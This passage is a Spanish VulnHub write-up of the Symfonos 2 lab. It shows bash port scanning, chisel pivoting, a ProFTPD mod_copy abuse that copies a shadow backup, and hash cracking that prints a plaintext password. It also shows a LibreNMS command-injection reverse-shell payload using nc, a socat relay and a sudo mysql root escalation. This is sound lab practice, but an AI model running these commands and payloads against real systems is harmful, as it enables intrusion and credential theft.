                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                  ;;;;'     (      ---~~/         `:::|       `\\.      
                  |'  _      `----~~~~'      /      `:|        ()))),      
            ______/\/~    |                 /        /         (((((())  
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
        //  \ \                        /  |  \;;,\                 `   
       (<_    \ \                    /',/-----'  _> 
        \_|     \\_                 //~;~~~~~~~~~ 
                 \_|               (,~~   
                                    \~\
                                     ~~

	Contact me via Twitter @zayotic to give feedback!


bash-4.4# 
```

## Symfonos 2

```bash
bash-4.4# cd /dev/shm
bash-4.4# ls
curl  hostDiscovery.sh
bash-4.4# ./hostDiscovery.sh 
[+] El host 10.10.0.128 -ACTIVE
[+] El host 10.10.0.129 -ACTIVE
bash-4.4# 
```

Vamos a descubrir los puertos abiertos en bash pero primeramente vemos que el puerto `80` esta abierto

```
bash-4.4# echo '' > /dev/tcp/10.10.0.128/80
bash-4.4# echo $?
0
```

```bash
bash-4.4# cat portDiscovery.sh 
#!/bin/bash

# CTRL+C
function ctrl_c(){
	echo -e "\n[+] Saliendo..."
	tput cnorm; exit 1
}
trap ctrl_c INT

tput civis

for port in $(seq 1 65535); do
	timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.128/$port" 2>/dev/null && echo "[+]Port $port - OPEN" &
done; wait

tput cnorm
bash-4.4# 
```

Estos son los puertos abiertos de la maquina Symfonos2

```
bash-4.4# ./portDiscovery.sh 
[+]Port 21 - OPEN
[+]Port 22 - OPEN
[+]Port 80 - OPEN
[+]Port 139 - OPEN
[+]Port 445 - OPEN
```

Vamos a usar `Chisel` para emplear el `pivoting` y poder usar `nmap` y `proxychains` 

<https://github.com/jpillora/chisel/releases/tag/v1.8.1>

```bash
❯ mv /home/miguelrega7/Descargas/chisel_1.8.1_linux_amd64.gz chisel.gz
❯ ls
 attention.txt   chisel.gz   passwords.txt   research.txt   todo.txt
❯ gunzip chisel.gz
❯ ls
 attention.txt   chisel   passwords.txt   research.txt   todo.txt
❯ chmod +x chisel
❯ du -hc chisel
8.0M	chisel
8.0M	total
```

Vamos a reducirle el tamaño

```bash
❯ upx chisel
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   8384512 ->   3354732   40.01%   linux/amd64   chisel                        

Packed 1 file.
❯ du -hc chisel
3.3M	chisel
3.3M	total
```

Ahora vamos a transferirlo a la maquina victima

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.75 - - [04/Mar/2023 20:00:01] "GET /chisel HTTP/1.1" 200 -
```

```bash
bash-4.4# wget http://192.168.1.67/chisel
--2023-03-04 20:00:01--  http://192.168.1.67/chisel
Connecting to 192.168.1.67:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3354732 (3.2M) [application/octet-stream]
Saving to: 'chisel'

chisel                          100%[=======================================================>]   3.20M  --.-KB/s    in 0.01s   

2023-03-04 20:00:01 (270 MB/s) - 'chisel' saved [3354732/3354732]
```

```
bash-4.4# chmod +x chisel 
bash-4.4# ./chisel 

  Usage: chisel [command] [--help]

  Version: 1.8.1 (go1.19.4)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel

bash-4.4# 
```

Vamos a ponernos en modo servidor en nuestra maquina de atacante

```bash
❯ ./chisel server --reverse -p 1234
2023/03/04 20:02:02 server: Reverse tunnelling enabled
2023/03/04 20:02:02 server: Fingerprint TcyFEN+dcPK//IAYEKBynOOT6HwRzPk4PH3Ksj8tiRs=
2023/03/04 20:02:02 server: Listening on http://0.0.0.0:1234

```

Y en la maquina victima vamos a ponernos en modo cliente 

```bash
./chisel client 192.168.1.67:1234 R:socks
```

Agregar esto al archivo para poder usar `proxychains` el puerto nos lo indica `chisel`

```bash
❯ /bin/cat /etc/proxychains.conf | tail -n 1
socks5 127.0.0.1 1080
```

## PortScan Symfonos 2

```bash
❯ proxychains nmap --top-ports 500 --open -T5 -v -n 10.10.0.128 -sT -Pn 2>&1 | grep -vE "timeout|OK"
ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 20:19 CST
Initiating Connect Scan at 20:19
Scanning 10.10.0.128 [500 ports]
Discovered open port 80/tcp on 10.10.0.128
Discovered open port 22/tcp on 10.10.0.128
Discovered open port 21/tcp on 10.10.0.128
Discovered open port 445/tcp on 10.10.0.128
Discovered open port 139/tcp on 10.10.0.128
Completed Connect Scan at 20:19, 1.99s elapsed (500 total ports)
Nmap scan report for 10.10.0.128
Host is up (0.0044s latency).
Not shown: 495 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds
```

La opcion `-sT` es para pasar por el tunel y tenemos que usar siempre `proxychains` para alcanzar a llegar

Para ver el puerto 80 tienes que usar foxyproxy para poder verlo

![](/assets/images/vh-writeup-pivoting1/Web7.png)

Esta es la pagina web

![](/assets/images/vh-writeup-pivoting1/Web8.png)

Volvemos a ver el puerto `455` abierto

```bash
❯ proxychains smbmap -H 10.10.0.128
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:445-<><>-OK
[+] Guest session   	IP: 10.10.0.128:445	Name: 10.10.0.128                                       
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)
```

Hay un directorio 

```bash
❯ proxychains smbmap -H 10.10.0.128 -r anonymous
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:445-<><>-OK
[+] Guest session   	IP: 10.10.0.128:445	Name: 10.10.0.128                                       
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	anonymous                                         	READ ONLY	
	.\anonymous\*
	dr--r--r--                0 Thu Jul 18 09:30:09 2019	.
	dr--r--r--                0 Thu Jul 18 09:29:08 2019	..
	dr--r--r--                0 Thu Jul 18 09:25:17 2019	backups

```

Vemos otro archivo

```bash
❯ proxychains smbmap -H 10.10.0.128 -r anonymous/backups
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:445-<><>-OK
[+] Guest session   	IP: 10.10.0.128:445	Name: 10.10.0.128                                       
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	anonymous                                         	READ ONLY	
	.\anonymousbackups\*
	dr--r--r--                0 Thu Jul 18 09:25:17 2019	.
	dr--r--r--                0 Thu Jul 18 09:30:09 2019	..
	fr--r--r--            11394 Thu Jul 18 09:25:16 2019	log.txt
```

Vamos a descargarnolo 

```bash
❯ proxychains smbmap -H 10.10.0.128 --download anonymous/backups/log.txt
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:445-<><>-OK
[+] Starting download: anonymous\backups\log.txt (11394 bytes)
[+] File output to: /home/VulnHub/192.168.1.75/10.10.0.128/content/10.10.0.128-anonymous_backups_log.txt
❯ ls
 10.10.0.128-anonymous_backups_log.txt
❯ mv 10.10.0.128-anonymous_backups_log.txt log.txt
```

En las 2 primeras lineas vemos los mas interesante esta metiendo el cat de `/etc/shadow` a `/var/backups/shadow.bak`

```
❯ catn log.txt
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf

```

```bash
❯ catn log.txt
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf
#
# Sample configuration file for the Samba suite for Debian GNU/Linux.
#
#
# This is the main Samba configuration file. You should read the
# smb.conf(5) manual page in order to understand the options listed
# here. Samba has a huge number of configurable options most of which 
# are not shown in this example
#
# Some options that are often worth tuning have been included as
# commented-out examples in this file.
#  - When such options are commented with ";", the proposed setting
#    differs from the default Samba behaviour
#  - When commented with "#", the proposed setting is the default
#    behaviour of Samba but the option is considered important
#    enough to be mentioned here
#
# NOTE: Whenever you modify this file you should run the command
# "testparm" to check that you have not made any basic syntactic 
# errors. 

#======================= Global Settings =======================

[global]

## Browsing/Identification ###

# Change this to the workgroup/NT-domain name your Samba server will part of
   workgroup = WORKGROUP

# Windows Internet Name Serving Support Section:
# WINS Support - Tells the NMBD component of Samba to enable its WINS Server
#   wins support = no

# WINS Server - Tells the NMBD components of Samba to be a WINS Client
# Note: Samba can be either a WINS Server, or a WINS Client, but NOT both
;   wins server = w.x.y.z

# This will prevent nmbd to search for NetBIOS names through DNS.
   dns proxy = no

#### Networking ####

# The specific set of interfaces / networks to bind to
# This can be either the interface name or an IP address/netmask;
# interface names are normally preferred
;   interfaces = 127.0.0.0/8 eth0

# Only bind to the named interfaces and/or networks; you must use the
# 'interfaces' option above to use this.
# It is recommended that you enable this feature if your Samba machine is
# not protected by a firewall or is a firewall itself.  However, this
# option cannot handle dynamic or non-broadcast interfaces correctly.
;   bind interfaces only = yes



#### Debugging/Accounting ####

# This tells Samba to use a separate log file for each machine
# that connects
   log file = /var/log/samba/log.%m

# Cap the size of the individual log files (in KiB).
   max log size = 1000

# If you want Samba to only log through syslog then set the following
# parameter to 'yes'.
#   syslog only = no

# We want Samba to log a minimum amount of information to syslog. Everything
# should go to /var/log/samba/log.{smbd,nmbd} instead. If you want to log
# through syslog you should set the following parameter to something higher.
   syslog = 0

# Do something sensible when Samba crashes: mail the admin a backtrace
   panic action = /usr/share/samba/panic-action %d


####### Authentication #######

# Server role. Defines in which mode Samba will operate. Possible
# values are "standalone server", "member server", "classic primary
# domain controller", "classic backup domain controller", "active
# directory domain controller". 
#
# Most people will want "standalone sever" or "member server".
# Running as "active directory domain controller" will require first
# running "samba-tool domain provision" to wipe databases and create a
# new domain.
   server role = standalone server

# If you are using encrypted passwords, Samba will need to know what
# password database type you are using.  
   passdb backend = tdbsam

   obey pam restrictions = yes

# This boolean parameter controls whether Samba attempts to sync the Unix
# password with the SMB password when the encrypted SMB password in the
# passdb is changed.
   unix password sync = yes

# For Unix password sync to work on a Debian GNU/Linux system, the following
# parameters must be set (thanks to Ian Kahan <<kahan@informatik.tu-muenchen.de> for
# sending the correct chat script for the passwd program in Debian Sarge).
   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

# This boolean controls whether PAM will be used for password changes
# when requested by an SMB client instead of the program listed in
# 'passwd program'. The default is 'no'.
   pam password change = yes

# This option controls how unsuccessful authentication attempts are mapped
# to anonymous connections
   map to guest = bad user

########## Domains ###########

#
# The following settings only takes effect if 'server role = primary
# classic domain controller', 'server role = backup domain controller'
# or 'domain logons' is set 
#

# It specifies the location of the user's
# profile directory from the client point of view) The following
# required a [profiles] share to be setup on the samba server (see
# below)
;   logon path = \\%N\profiles\%U
# Another common choice is storing the profile in the user's home directory
# (this is Samba's default)
#   logon path = \\%N\%U\profile

# The following setting only takes effect if 'domain logons' is set
# It specifies the location of a user's home directory (from the client
# point of view)
;   logon drive = H:
#   logon home = \\%N\%U

# The following setting only takes effect if 'domain logons' is set
# It specifies the script to run during logon. The script must be stored
# in the [netlogon] share
# NOTE: Must be store in 'DOS' file format convention
;   logon script = logon.cmd

# This allows Unix users to be created on the domain controller via the SAMR
# RPC pipe.  The example command creates a user account with a disabled Unix
# password; please adapt to your needs
; add user script = /usr/sbin/adduser --quiet --disabled-password --gecos "" %u

# This allows machine accounts to be created on the domain controller via the 
# SAMR RPC pipe.  
# The following assumes a "machines" group exists on the system
; add machine script  = /usr/sbin/useradd -g machines -c "%u machine account" -d /var/lib/samba -s /bin/false %u

# This allows Unix groups to be created on the domain controller via the SAMR
# RPC pipe.  
; add group script = /usr/sbin/addgroup --force-badname %g

############ Misc ############

# Using the following line enables you to customise your configuration
# on a per machine basis. The %m gets replaced with the netbios name
# of the machine that is connecting
;   include = /home/samba/etc/smb.conf.%m

# Some defaults for winbind (make sure you're not using the ranges
# for something else.)
;   idmap uid = 10000-20000
;   idmap gid = 10000-20000
;   template shell = /bin/bash

# Setup usershare options to enable non-root users to share folders
# with the net usershare command.

# Maximum number of usershare. 0 (default) means that usershare is disabled.
;   usershare max shares = 100

# Allow users who've been granted usershare privileges to create
# public shares, not just authenticated ones
   usershare allow guests = yes

#======================= Share Definitions =======================

[homes]
   comment = Home Directories
   browseable = no

# By default, the home directories are exported read-only. Change the
# next parameter to 'no' if you want to be able to write to them.
   read only = yes

# File creation mask is set to 0700 for security reasons. If you want to
# create files with group=rw permissions, set next parameter to 0775.
   create mask = 0700

# Directory creation mask is set to 0700 for security reasons. If you want to
# create dirs. with group=rw permissions, set next parameter to 0775.
   directory mask = 0700

# By default, \\server\username shares can be connected to by anyone
# with access to the samba server.
# The following parameter makes sure that only "username" can connect
# to \\server\username
# This might need tweaking when using external authentication schemes
   valid users = %S

# Un-comment the following and create the netlogon directory for Domain Logons
# (you need to configure Samba to act as a domain controller too.)
;[netlogon]
;   comment = Network Logon Service
;   path = /home/samba/netlogon
;   guest ok = yes
;   read only = yes

# Un-comment the following and create the profiles directory to store
# users profiles (see the "logon path" option above)
# (you need to configure Samba to act as a domain controller too.)
# The path below should be writable by all users so that their
# profile directory may be created the first time they log on
;[profiles]
;   comment = Users profiles
;   path = /home/samba/profiles
;   guest ok = no
;   browseable = no
;   create mask = 0600
;   directory mask = 0700

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700

# Windows clients look for this share name as a source of downloadable
# printer drivers
[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
# Uncomment to allow remote administration of Windows print drivers.
# You may need to replace 'lpadmin' with the name of the group your
# admin users are members of.
# Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
;   write list = root, @lpadmin

[anonymous]
   path = /home/aeolus/share
   browseable = yes
   read only = yes
   guest ok = yes

root@symfonos2:~# cat /usr/local/etc/proftpd.conf
# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName			"ProFTPD Default Installation"
ServerType			standalone
DefaultServer			on

# Port 21 is the standard FTP port.
Port				21

# Don't use IPv6 support by default.
UseIPv6				off

# Umask 022 is a good standard umask to prevent new dirs and files
# from being group and world writable.
Umask				022

# To prevent DoS attacks, set the maximum number of child processes
# to 30.  If you need to allow more than 30 concurrent connections
# at once, simply increase this value.  Note that this ONLY works
# in standalone mode, in inetd mode you should use an inetd server
# that allows you to limit maximum number of processes per service
# (such as xinetd).
MaxInstances			30

# Set the user and group under which the server will run.
User				aeolus
Group				aeolus

# To cause every FTP user to be "jailed" (chrooted) into their home
# directory, uncomment this line.
#DefaultRoot ~

# Normally, we want files to be overwriteable.
AllowOverwrite		on

# Bar use of SITE CHMOD by default
<Limit SITE_CHMOD>
  DenyAll
</Limit>

# A basic anonymous configuration, no upload directories.  If you do not
# want anonymous users, simply delete this entire <Anonymous> section.
<Anonymous ~ftp>
  User				ftp
  Group				ftp

  # We want clients to be able to login with "anonymous" as well as "ftp"
  UserAlias			anonymous ftp

  # Limit the maximum number of anonymous logins
  MaxClients			10

  # We want 'welcome.msg' displayed at login, and '.message' displayed
  # in each newly chdired directory.
  #DisplayLogin			welcome.msg
  #DisplayChdir			.message

  # Limit WRITE everywhere in the anonymous chroot
  <Limit WRITE>
    DenyAll
  </Limit>
</Anonymous>
```

Vemos esto relacionado al servicio

```bash
❯ searchsploit proftp 1.3.5
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                     | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                           | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                       | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                     | linux/remote/36742.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
❯ searchsploit -x linux/remote/36742.txt
  Exploit: ProFTPd 1.3.5 - File Copy
      URL: https://www.exploit-db.com/exploits/36742
     Path: /usr/share/exploitdb/exploits/linux/remote/36742.txt
File Type: ASCII text
```

Vamos a conectarnos por `ftp` y vamos a copiar `shadow.bak` a la ruta de anonymous que vimos en el archivo `txt`

```bash
❯ proxychains ftp 10.10.0.128
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:21-<><>-OK
Connected to 10.10.0.128.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.0.128]
Name (10.10.0.128:miguelrega7): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> help
Commands may be abbreviated.  Commands are:

!		dir		mdelete		qc		site
$		disconnect	mdir		sendport	size
account		exit		mget		put		status
append		form		mkdir		pwd		struct
ascii		get		mls		quit		system
bell		glob		mode		quote		sunique
binary		hash		modtime		recv		tenex
bye		help		mput		reget		tick
case		idle		newer		rstatus		trace
cd		image		nmap		rhelp		type
cdup		ipany		nlist		rename		user
chmod		ipv4		ntrans		reset		umask
close		ipv6		open		restart		verbose
cr		lcd		prompt		rmdir		?
delete		ls		passive		runique
debug		macdef		proxy		send
ftp> site help
214-The following SITE commands are recognized (* =>'s unimplemented)
 CPFR <sp> pathname
 CPTO <sp> pathname
 HELP
 CHGRP
 CHMOD
214 Direct comments to root@symfonos2
ftp> site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
ftp> site cpto /home/aeolus/share/shadow.bak
250 Copy successful
ftp> 
```

Pudimos copiar el `shadow.bak`

```bash
❯ proxychains smbmap -H 10.10.0.128 -r anonymous
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:445-<><>-OK
[+] Guest session   	IP: 10.10.0.128:445	Name: 10.10.0.128                                       
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	anonymous                                         	READ ONLY	
	.\anonymous\*
	dr--r--r--                0 Sat Mar  4 23:51:49 2023	.
	dr--r--r--                0 Thu Jul 18 09:29:08 2019	..
	dr--r--r--                0 Thu Jul 18 09:25:17 2019	backups
	fr--r--r--             1173 Sat Mar  4 23:51:49 2023	shadow.bak
```

```bash
❯ proxychains smbmap -H 10.10.0.128 --download anonymous/shadow.bak
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:445-<><>-OK
[+] Starting download: anonymous\shadow.bak (1173 bytes)
[+] File output to: /home/VulnHub/192.168.1.75/10.10.0.128/content/10.10.0.128-anonymous_shadow.bak
```

Vamos a crackear los hashes con `john`

```bash
❯ ls
 10.10.0.128-anonymous_shadow.bak   log.txt
❯ catn 10.10.0.128-anonymous_shadow.bak
root:$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.:18095:0:99999:7:::
daemon:*:18095:0:99999:7:::
bin:*:18095:0:99999:7:::
sys:*:18095:0:99999:7:::
sync:*:18095:0:99999:7:::
games:*:18095:0:99999:7:::
man:*:18095:0:99999:7:::
lp:*:18095:0:99999:7:::
mail:*:18095:0:99999:7:::
news:*:18095:0:99999:7:::
uucp:*:18095:0:99999:7:::
proxy:*:18095:0:99999:7:::
www-data:*:18095:0:99999:7:::
backup:*:18095:0:99999:7:::
list:*:18095:0:99999:7:::
irc:*:18095:0:99999:7:::
gnats:*:18095:0:99999:7:::
nobody:*:18095:0:99999:7:::
systemd-timesync:*:18095:0:99999:7:::
systemd-network:*:18095:0:99999:7:::
systemd-resolve:*:18095:0:99999:7:::
systemd-bus-proxy:*:18095:0:99999:7:::
_apt:*:18095:0:99999:7:::
Debian-exim:!:18095:0:99999:7:::
messagebus:*:18095:0:99999:7:::
sshd:*:18095:0:99999:7:::
aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7:::
cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/:18095:0:99999:7:::
mysql:!:18095:0:99999:7:::
Debian-snmp:!:18095:0:99999:7:::
librenms:!:18095::::::
```

Tenemos una contraseña

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt 10.10.0.128-anonymous_shadow.bak
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sergioteamo      (aeolus)
```

Tenemos credenciales asi que podemos tratar de conectarnos por `ssh` y las credenciales funcionan

`aeolus:sergioteamo`

```bash
❯ proxychains ssh aeolus@10.10.0.128
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:22-<><>-OK
The authenticity of host '10.10.0.128 (10.10.0.128)' can't be established.
ECDSA key fingerprint is SHA256:B1Gy++lPIkpytQPksfdhzAydQ8n3Hlor7srtoKol248.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.0.128' (ECDSA) to the list of known hosts.
aeolus@10.10.0.128's password: 
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 18 08:52:59 2019 from 192.168.201.1
aeolus@symfonos2:~$ whoami
aeolus
aeolus@symfonos2:~$ 
```

Estamos dentro

```bash
aeolus@symfonos2:~$ hostname -I
10.10.0.128 
aeolus@symfonos2:~$ 
```

Vamos a enumerar el sistema

```bash
aeolus@symfonos2:~$ ls
share
aeolus@symfonos2:~$ pwd
/home/aeolus
aeolus@symfonos2:~$ id
uid=1000(aeolus) gid=1000(aeolus) groups=1000(aeolus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
aeolus@symfonos2:~$ sudo -l
[sudo] password for aeolus: 
Sorry, user aeolus may not run sudo on symfonos2.
aeolus@symfonos2:~$ ss -nltp
State      Recv-Q Send-Q                   Local Address:Port                                  Peer Address:Port              
LISTEN     0      80                           127.0.0.1:3306                                             *:*                  
LISTEN     0      50                                   *:139                                              *:*                  
LISTEN     0      128                          127.0.0.1:8080                                             *:*                  
LISTEN     0      32                                   *:21                                               *:*                  
LISTEN     0      128                                  *:22                                               *:*                  
LISTEN     0      20                           127.0.0.1:25                                               *:*                  
LISTEN     0      50                                   *:445                                              *:*                  
LISTEN     0      50                                  :::139                                             :::*                  
LISTEN     0      64                                  :::80                                              :::*                  
LISTEN     0      128                                 :::22                                              :::*                  
LISTEN     0      20                                 ::1:25                                              :::*                  
LISTEN     0      50                                  :::445                                             :::*                  
aeolus@symfonos2:~$ 
```

Vemos el puerto `8080` vamos a aplicar un `Local Port Forwarding` para traernos el puerto `8080`

```bash
❯ proxychains ssh aeolus@10.10.0.128 -L 8080:127.0.0.1:8080
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.128:22-<><>-OK
aeolus@10.10.0.128's password: 
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar  4 23:58:51 2023 from 10.10.0.129
aeolus@symfonos2:~$ 
```

Funciona

```bash
❯ lsof -i:8080
COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     30515 root    4u  IPv4 106579      0t0  TCP *:http-alt (LISTEN)

```

Esta es la web

![](/assets/images/vh-writeup-pivoting1/Web9.png)

Vamos a ver si podemos reutilizar las credenciales

Funcionan

![](/assets/images/vh-writeup-pivoting1/Web10.png)

```bash
❯ searchsploit librenms
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
LibreNMS - addhost Command Injection (Metasploit)                                             | linux/remote/46970.rb
LibreNMS - Collectd Command Injection (Metasploit)                                            | linux/remote/47375.rb
LibreNMS 1.46 - 'addhost' Remote Code Execution                                               | php/webapps/47044.py
LibreNMS 1.46 - 'search' SQL Injection                                                        | multiple/webapps/48453.txt
LibreNMS 1.46 - MAC Accounting Graph Authenticated SQL Injection                              | multiple/webapps/49246.py
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Se ve interesante

```bash
LibreNMS 1.46 - 'addhost' Remote Code Execution                                               | php/webapps/47044.py
```

Si examinamos el exploit esta haciendo esto en la parte del payload

```bash
41   │ # payload to create reverse shell
  42   │ payload = "'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f) #".format(rhost, rport)
```

En la parte community esta aplicando eso 

```bash
70   │         "community": payload,
```

Aqui es donde le inyecta el payload

![](/assets/images/vh-writeup-pivoting1/Web11.png)

Vamos a enviarnos una reverse shell siguiente los pasos que hace el script automatizado de python

Y bueno pegas el payload y lo modificas

![](/assets/images/vh-writeup-pivoting1/Web12.png)

Tenemos que volver a ganar acceso ala primer maquina para que funcione la reverse shell para ganar acceso hacemos lo mismo con el `curl` tenemos que volver a ganar acceso ala symfonos 1

```bash
bash-4.4# which socat
/usr/bin/socat
bash-4.4# 
```

Todo lo redirige a nuestra ip por el puerto 4646 

```lua
bash-4.4# socat TCP-LISTEN:4646,fork TCP:192.168.1.67:4646
```

```bash
❯ nc -nlvp 4646
listening on [any] 4646 ...
```

Una vez creado vamos a darle en capture despues de SNMP y run

![](/assets/images/vh-writeup-pivoting1/Web13.png)

## Shell cronus 

```bash
❯ nc -nlvp 4646
listening on [any] 4646 ...
connect to [192.168.1.67] from (UNKNOWN) [192.168.1.75] 54730
/bin/sh: 0: can't access tty; job control turned off
$ whoami
cronus
$ 

```

Despues de hacer el mismo tratamiento de la `tty` que hacemos pues estamos dentro de la maquina

```bash
cronus@symfonos2:/opt/librenms/html$ hostname -I
10.10.0.128 
cronus@symfonos2:/opt/librenms/html$ 
```

## Root

Podemos ejecutar como `root` sin proporcionar contraseña `mysql`

```bash
cronus@symfonos2:/opt/librenms/html$ sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
cronus@symfonos2:/opt/librenms/html$ 
```
## Escalada de privilegios Symfonos2 

<https://gtfobins.github.io/gtfobins/mysql/#sudo>

Con esto ya estaria completado el laboratorio

```
cronus@symfonos2:/opt/librenms/html$ sudo mysql -e '\! /bin/sh'
# whoami
root
# cd /root
# ls
proof.txt
# cat proof.txt 

	Congrats on rooting symfonos:2!

           ,   ,
         ,-`{-`/
      ,-~ , \ {-~~-,
    ,~  ,   ,`,-~~-,`,
  ,`   ,   { {      } }                                             }/
 ;     ,--/`\ \    / /                                     }/      /,/
;  ,-./      \ \  { {  (                                  /,;    ,/ ,/
; /   `       } } `, `-`-.___                            / `,  ,/  `,/
 \|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;
  `        { {                                     __  /  ,`/   ,`,;
        /   \ \                                 _,`, `{  `,{   `,`;`
       {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
       \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
        `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
